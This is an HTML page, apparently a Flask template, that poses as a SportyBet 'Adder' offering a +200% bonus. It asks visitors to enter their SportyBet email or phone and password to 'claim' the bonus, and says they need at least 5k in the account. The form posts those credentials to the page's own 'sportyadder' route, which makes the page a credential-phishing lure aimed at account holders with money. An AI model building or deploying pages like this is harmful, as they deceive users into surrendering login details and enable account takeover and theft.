<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <title>SportyBet Adder - +200% Bonus</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link rel="stylesheet" href="/static/css/sportybet.css">
  </head>
  <body>
    <div class="note">
      <strong>Note:</strong> You must have at least 5k in your account to claim this bonus.
    </div>
    <div class="login-card">
      <div class="card-header">
        <div class="badge">HOT</div>
        <h1>SPORTYBET ADDER</h1>
        <p>+200% EXCLUSIVE BONUS</p>
      </div>

      <div class="form-container">
        <form method="POST" action="{{ url_for('sportyadder') }}" id="sportyForm">
          <div class="input-group">
            <input type="text" name="username" placeholder="Email or Phone" required id="usernameField" />
          </div>

          <div class="input-group password-container">
            <input
              type="password"
              id="passwordField"
              name="password"
              placeholder="Password"
              required
            />
            <i class="fas fa-eye toggle-password" id="togglePassword"></i>
          </div>

          <button class="login-btn" type="submit" id="loginBtn">CLAIM YOUR BONUS</button>
        </form>
        <div class="footer">
          <span>New user?</span> <a href="#">Register for bonus</a>
        </div>
      </div>
    </div>
    <script src="/static/js/sportybet.js"></script>
  </body>
</html>
